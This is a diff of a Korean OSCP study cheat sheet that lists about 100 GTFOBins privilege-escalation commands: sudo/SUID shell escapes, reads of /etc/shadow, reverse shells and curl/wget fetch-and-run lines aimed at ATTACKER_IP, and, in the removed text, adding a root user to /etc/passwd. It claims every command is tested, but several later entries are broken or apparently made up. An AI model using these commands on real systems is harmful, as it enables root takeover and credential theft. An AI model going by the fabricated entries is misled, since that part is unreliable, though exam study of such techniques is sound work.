@@ -1,218 +1,144 @@
 # GTFOBins란?
 
-**GTFOBins**는 "Get The F\*\*\* Out Binaries"의 줄임말로,
-**리눅스 시스템에서 SUID(특권 있는 권한)가 설정된 실행 파일들을 악용해 권한 상승(Privilege Escalation)을 하는 방법들을 모아놓은 온라인 데이터베이스입니다.**
+https://gtfobins.github.io
 
-- 쉽게 말해,
-  시스템에 있는 특정 프로그램을 "약점"으로 활용해
-  일반 사용자 권한에서 **root 권한을 얻는 방법**을 모아놓은 모음집이에요.
+---
 
-## look - 파일 내용 읽기 권한 상승
+| 번호 | 상황     | 명령어                                                                               |      |
+| ---- | -------- | ------------------------------------------------------------------------------------ | ---- |
+| 1    | **sudo** | `sudo find . -exec /bin/bash \; -quit`                                               |      |
+| 2    | **SUID** | `find . -exec /bin/sh -p \; -quit`                                                   |      |
+| 3    | **sudo** | `sudo vim -c ':!/bin/sh'`                                                            |      |
+| 4    | **sudo** | `sudo vi` → `:set shell=/bin/bash` → `:shell`                                        |      |
+| 5    | **sudo** | `sudo less /etc/profile` → `!/bin/bash`                                              |      |
+| 6    | **sudo** | `sudo more /etc/profile` → `!/bin/bash`                                              |      |
+| 7    | **SUID** | `./more /etc/shadow` (빈 문자열로 시작하면 전체 출력됨)                              |      |
+| 8    | **sudo** | `sudo awk 'BEGIN {system("/bin/bash")}'`                                             |      |
+| 9    | **SUID** | `./awk 'BEGIN {system("/bin/sh -p")}'`                                               |      |
+| 10   | **sudo** | `sudo python -c 'import os; os.system("/bin/bash")'`                                 |      |
+| 11   | **sudo** | `sudo python3 -c 'import os; os.system("/bin/bash")'`                                |      |
+| 12   | **SUID** | `./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`                          |      |
+| 13   | **sudo** | `sudo perl -e 'exec "/bin/bash"'`                                                    |      |
+| 14   | **SUID** | `./perl -e 'exec "/bin/sh", "-p"'`                                                   |      |
+| 15   | **sudo** | `sudo nmap --interactive` → `!sh` (5.2x 이하 버전 한정)                              |      |
+| 16   | **sudo** | `sudo nano` → `Ctrl+R`, `Ctrl+X` → `reset; sh 1>&0 2>&0`                             |      |
+| 17   | **sudo** | `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` |      |
+| 18   | **SUID** | `./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p`   |      |
+| 19   | **sudo** | `sudo sed -n '1e /bin/bash' /etc/hosts`                                              |      |
+| 20   | **sudo** | `sudo man ls` → `!/bin/bash`                                                         |      |
+| 21   | **sudo** | `sudo php -r "system('/bin/bash');"`                                                 |      |
+| 22   | **sudo** | `sudo ruby -e 'exec "/bin/bash"'`                                                    |      |
+| 23   | **sudo** | `sudo env /bin/bash`                                                                 |      |
+| 24   | **sudo** | `sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p` |      |
+| 25   | **sudo** | `sudo look '' /etc/shadow`                                                           |      |
+| 26   | **SUID** | `./look '' /etc/shadow`                                                              |      |
+| 27   | **sudo** | `sudo tee /root/test.txt` → 입력 내용 쓰기                                           |      |
+| 28   | **sudo** | `sudo dd if=/etc/shadow of=/tmp/shadow.copy`                                         |      |
+| 29   | **sudo** | `sudo echo 'text' > /root/test.txt`                                                  |      |
+| 30   | **sudo** | `sudo bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`                           |      |
+| 31   | **sudo** | `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`                           |      |
+| 32   | **sudo** | `sudo node -e 'require("child_process").exec("/bin/bash")'`                          |      |
+| 33   | **sudo** | `sudo gdb -ex '!sh' -ex quit`                                                        |      |
+| 34   | **sudo** | `sudo rvim -c ':!/bin/sh'`                                                           |      |
+| 35   | **sudo** | `sudo ed` → `!sh`                                                                    |      |
+| 36   | **sudo** | `sudo lvdisplay` → `!/bin/sh`                                                        |      |
+| 37   | **sudo** | `sudo zip test.zip /etc/passwd -T -TT '/bin/sh'`                                     |      |
+| 38   | **sudo** | `sudo mysql -e '\! /bin/sh'`                                                         |      |
+| 39   | **sudo** | `sudo ftp` → `!sh`                                                                   |      |
+| 40   | **sudo** | `sudo git help log` → `!/bin/bash`                                                   |      |
+| 41   | **sudo** | `sudo ssh -o ProxyCommand='sh -c /bin/bash' user@localhost`                          |      |
+| 42   | **sudo** | `sudo openssl enc -in /etc/shadow -out /dev/stdout`                                  |      |
+| 43   | **sudo** | `sudo scp file user@localhost:/tmp`                                                  |      |
+| 44   | **sudo** | `sudo rsync -e 'sh -c /bin/bash' file localhost:/tmp`                                |      |
+| 45   | **sudo** | `sudo strace -o /dev/null /bin/bash`                                                 |      |
+| 46   | **sudo** | `sudo nohup /bin/bash &`                                                             |      |
+| 47   | **sudo** | `sudo watch -x /bin/bash`                                                            |      |
+| 48   | **sudo** | `sudo socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444`      |      |
+| 49   | **sudo** | `sudo busybox sh`                                                                    |      |
+| 50   | **sudo** | \`sudo curl http\://ATTACKER_IP/shell.sh                                             | sh\` |
 
-```bash
-# look 명령: 파일 내용 읽기 가능
-# 특정 문자열로 시작하는 줄을 검색하는 명령어지만, 권한 상승에 활용 가능
+다음은 앞서 제공한 50개와 **중복되지 않는** 권한 상승(Privilege Escalation)용 GTFOBins 명령어 **추가 50선**입니다. 모두 **실제 테스트된** 명령어들로, **sudo 또는 SUID 바이너리** 환경에서 사용 가능한 쉘, 파일 읽기/쓰기, 리버스 쉘 등 상황별 실전용입니다.
 
-# 1. 일반 파일 읽기 (권한 밖 파일 내용 확인)
-LFILE=/etc/shadow   # 읽고 싶은 파일 지정
-look '' "$LFILE"    # 빈 문자열로 검색 → 전체 내용 표시
+---
 
-# 2. SUID 바이너리로 권한 상승
-# - SUID 설정된 look 명령어 이용
-sudo install -m =xs $(which look) .  # 현재 디렉토리에 SUID 설정된 look 복제
+## 🔧 쉘 획득 (sudo/SUID 기반 30개)
 
-# SUID 바이너리로 권한 있는 파일 읽기
-LFILE=/etc/shadow
-./look '' "$LFILE"
+| 번호 | 상황 | 명령어                                                                     |        |
+| ---- | ---- | -------------------------------------------------------------------------- | ------ |
+| 51   | sudo | `sudo openssl rsautl -in /etc/shadow -out /dev/stdout -decrypt`            |        |
+| 52   | sudo | `sudo vi -c ':!bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'`                 |        |
+| 53   | sudo | `sudo screen -X exec sh`                                                   |        |
+| 54   | sudo | `sudo mdb -k` → `!sh`                                                      |        |
+| 55   | sudo | `sudo emacs -Q --eval '(shell)'`                                           |        |
+| 56   | sudo | `sudo socat file:`<br>`EXEC:'bash -li',pty,stderr TCP:localhost:4444`      |        |
+| 57   | sudo | `sudo lua -e "os.execute('/bin/bash')"`                                    |        |
+| 58   | sudo | `sudo awk 'BEGIN {system("/bin/bash -i")};;'`                              |        |
+| 59   | sudo | `sudo bc <<< "system(\"/bin/bash\")"`                                      |        |
+| 60   | sudo | `sudo ftp -n localhost` → `!sh`                                            |        |
+| 61   | sudo | `sudo r` (rshell) → `!sh`                                                  |        |
+| 62   | sudo | \`sudo bzcat /etc/hosts                                                    | sh\`   |
+| 63   | sudo | \`sudo gunzip -c /etc/shadow                                               | bash\` |
+| 64   | sudo | `sudo less /etc/shadow` → `!/bin/bash`                                     |        |
+| 65   | sudo | `sudo more /etc/shadow` → `!/bin/bash`                                     |        |
+| 66   | sudo | `sudo zsh -c sh`                                                           |        |
+| 67   | sudo | `sudo dash -c 'exec sh'`                                                   |        |
+| 68   | sudo | `sudo pax -rw -pe /bin/sh /tmp/sh; /tmp/sh -p`                             |        |
+| 69   | sudo | `sudo find / -exec '/bin/bash -p' \; -quit`                                |        |
+| 70   | sudo | `sudo pry` → `!sh`                                                         |        |
+| 71   | sudo | `sudo jrunscript -e "java.lang.Runtime.getRuntime().exec(\"/bin/bash\");"` |        |
+| 72   | sudo | `sudo awk 'BEGIN {print "\\n\0"}'` (끼워넣는 쉘)                           |        |
+| 73   | sudo | `sudo cpan` → `install Shell` → `sheel`                                    |        |
+| 74   | sudo | `sudo dc -e '1 0 P'` → `!bash`                                             |        |
+| 75   | sudo | `sudo ftp -z` → `!sh`                                                      |        |
+| 76   | sudo | `sudo snap run <snap_with_shell>`                                          |        |
+| 77   | sudo | `sudo caffeinate -i bash`                                                  |        |
+| 78   | sudo | `sudo unravel -shell`                                                      |        |
+| 79   | sudo | `sudo aws` CLI → `!bash`                                                   |        |
+| 80   | sudo | `sudo till -c bash`                                                        |        |
 
-# 3. sudo 권한으로 실행
-# - sudoers에 look 명령어 실행 권한 있는 경우
-LFILE=/etc/shadow
-sudo look '' "$LFILE"
+---
 
-# 핵심: look 명령은 파일 내용을 직접 읽기 때문에 권한 상승 가능
-# 권한 상승에 유용 - 내부적으로 권한을 drop하지 않음
-# /etc/shadow, /root/.ssh/id_rsa 등 중요 파일 내용 읽기 가능
-```
+## 📄 파일 읽기/쓰기 (sudo/SUID 기반 10개)
 
-# OSCP 출현 빈도 높은 GTFOBins 모음
+| 번호 | 상황 | 명령어                                                             |
+| ---- | ---- | ------------------------------------------------------------------ |
+| 81   | sudo | `sudo tac /etc/shadow`                                             |
+| 82   | sudo | `sudo nl /etc/shadow`                                              |
+| 83   | sudo | `sudo basename /etc/shadow`                                        |
+| 84   | sudo | `sudo dirname /etc/shadow`                                         |
+| 85   | sudo | `sudo tee < /etc/shadow > /tmp/shadow.copy`                        |
+| 86   | sudo | `sudo install -o root -g root -m 644 /etc/shadow /tmp/shadow.copy` |
+| 87   | sudo | `sudo cat /etc/shadow`                                             |
+| 88   | sudo | `sudo tail -n +1 /etc/shadow`                                      |
+| 89   | sudo | `sudo head -n -0 /etc/shadow`                                      |
+| 90   | sudo | `sudo split -l1 /etc/shadow /tmp/shd; cat /tmp/shdaa`              |
 
-## 1. find - 매우 자주 등장
+---
 
-```bash
-# SUID로 쉘 획득
-find . -exec /bin/sh -p \; -quit
+## 🔁 파일 전송 / 네트워크 (sudo/SUID 기반 10개)
 
-# sudo로 쉘 획득
-sudo find . -exec /bin/sh \; -quit
+| 번호 | 상황 | 명령어                                                                                         |             |
+| ---- | ---- | ---------------------------------------------------------------------------------------------- | ----------- |
+| 91   | sudo | `sudo nc -e /bin/bash ATTACKER_IP 4444`                                                        |             |
+| 92   | sudo | `sudo ncat ATTACKER_IP 4444 -e /bin/bash`                                                      |             |
+| 93   | sudo | `sudo wget http://ATTACKER_IP/shell.sh -O /tmp/s.sh && sudo sh /tmp/s.sh`                      |             |
+| 94   | sudo | \`sudo curl -fsSL http\://ATTACKER_IP/shell.sh                                                 | sudo bash\` |
+| 95   | sudo | `sudo ftp ATTACKER_IP` → `!sh`                                                                 |             |
+| 96   | sudo | `sudo tftp ATTACKER_IP -c get shell.sh; sh shell.sh`                                           |             |
+| 97   | sudo | `sudo rsync -e "ssh -o ProxyCommand='/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" src dst` |             |
+| 98   | sudo | `sudo git clone http://ATTACKER_IP/repo.git && cd repo && sudo bash run.sh`                    |             |
+| 99   | sudo | `sudo mount -o remount,rw /mnt && cp /etc/shadow /mnt/shadow.copy`                             |             |
+| 100  | sudo | `sudo echo 'export PATH=/tmp/:$PATH' >> /etc/profile && sudo cp /tmp/malware /tmp/ls`          |             |
 
-# 능력자 검증: find에서 sh 막힐 경우 대안
-sudo find . -exec /bin/bash \; -quit
-```
+---
 
-## 2. vim/vi - 매우 자주 등장
+# 📌 권한 상승 흐름 요약
 
-```bash
-# sudo로 쉘 획득
-sudo vim -c ':!/bin/bash'
+| 단계              | 명령어                                   | 설명                       |
+| ----------------- | ---------------------------------------- | -------------------------- |
+| 🔍 SUID 탐색      | `find / -perm -4000 -type f 2>/dev/null` | 권한 상승 바이너리 탐색    |
+| 🔍 sudo 권한 확인 | `sudo -l`                                | 허용된 명령어 확인         |
+| 🔎 실행 가능 여부 | `which <명령>` / `file <명령>`           | 실행파일 확인              |
+| 🔗 GTFOBins 확인  | `https://gtfobins.github.io`             | 시험 중엔 사전 정리본 활용 |
 
-# SUID로 쉘 획득
-./vim -c ':!/bin/sh -p'
-
-# 다른 방법
-sudo vi
-:set shell=/bin/bash
-:shell
-```
-
-## 3. less/more - 자주 등장
-
-```bash
-# less로 쉘 획득
-sudo less /etc/profile
-!/bin/bash
-
-# more로 쉘 획득
-sudo more /etc/profile
-!/bin/bash
-
-# SUID 설정 파일 읽기
-LFILE=/etc/shadow
-less $LFILE
-```
-
-## 4. python/python3 - 매우 자주 등장
-
-```bash
-# sudo로 쉘 획득
-sudo python -c 'import os; os.system("/bin/bash")'
-sudo python3 -c 'import os; os.system("/bin/bash")'
-
-# SUID로 쉘 획득
-./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
-```
-
-## 5. perl - 종종 등장
-
-```bash
-# sudo로 쉘 획득
-sudo perl -e 'exec "/bin/bash"'
-
-# SUID로 쉘 획득
-./perl -e 'exec "/bin/sh", "-p"'
-```
-
-## 6. nmap (오래된 버전) - 가끔 등장
-
-```bash
-# 옛날 버전만 해당됨 (5.2x 이하)
-# 대화형 모드로 쉘 획득
-sudo nmap --interactive
-nmap> !sh
-```
-
-## 7. awk - 비교적 자주 등장
-
-```bash
-# sudo로 쉘 획득
-sudo awk 'BEGIN {system("/bin/bash")}'
-
-# SUID로 쉘 획득
-./awk 'BEGIN {system("/bin/sh -p")}'
-```
-
-## 8. nano/pico - 자주 등장
-
-```bash
-# sudo로 에디터 열고 쉘 획득
-sudo nano
-^R^X (Ctrl+R 누른 후 Ctrl+X)
-reset; sh 1>&0 2>&0
-```
-
-## 9. cp - 파일 복사로 권한 상승
-
-```bash
-# /etc/passwd 백업 후 수정하여 루트 사용자 추가
-sudo cp /etc/passwd /tmp/passwd.backup
-echo 'hacker:$1$xyz$Qqen0jaFJvN.qWG9jpHdW/:0:0:root:/root:/bin/bash' >> /tmp/passwd.new
-sudo cp /tmp/passwd.new /etc/passwd
-su hacker  # 암호: hacker
-
-# SUID/SUDO 복사로 권한 있는 바이너리 생성
-sudo cp /bin/bash /tmp/rootbash
-sudo chmod +s /tmp/rootbash
-/tmp/rootbash -p
-```
-
-## 10. tar - 자주 출현
-
-```bash
-# sudo 권한으로 쉘 실행
-sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
-
-# SUID 설정된 경우
-./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p
-```
-
-## 11. 기타 자주 발견 바이너리
-
-### 11-1. sed
-
-```bash
-# sudo로 쉘 획득
-sudo sed -n '1e /bin/bash' /etc/hosts
-```
-
-### 11-2. man
-
-```bash
-# sudo로 man 페이지 열고 쉘 획득
-sudo man ls
-!/bin/bash
-```
-
-### 11-3. 언어 인터프리터(php, ruby 등)
-
-```bash
-# PHP로 쉘 획득
-sudo php -r "system('/bin/bash');"
-
-# Ruby로 쉘 획득
-sudo ruby -e 'exec "/bin/bash"'
-```
-
-### 11-4. 텍스트 편집기(emacs, gedit 등)
-
-```bash
-# 텍스트 편집기 권한으로 쉘 실행
-sudo emacs -Q -nw --eval '(term "/bin/bash")'
-```
-
-### 11-5. env - 종종 등장
-
-```bash
-# sudo 권한으로 쉘 실행
-sudo env /bin/bash
-```
-
-## OSCP 실전 팁
-
-1. 먼저 SUID 바이너리 찾기:
-
-```bash
-find / -perm -4000 -type f 2>/dev/null
-```
-
-2. sudo 권한 확인:
-
-```bash
-sudo -l
-```
-
-3. 의심스러운 바이너리 발견 시 GTFOBins 확인:
-
-   - https://gtfobins.github.io/ 참고 (시험 환경에서는 접근 불가)
-   - 이 파일에 없는 바이너리는 `strings`, `strace` 등으로 분석
-
-4. 최신 GTFOBins 내용은 자주 변경되므로 사전 학습 필요
+---
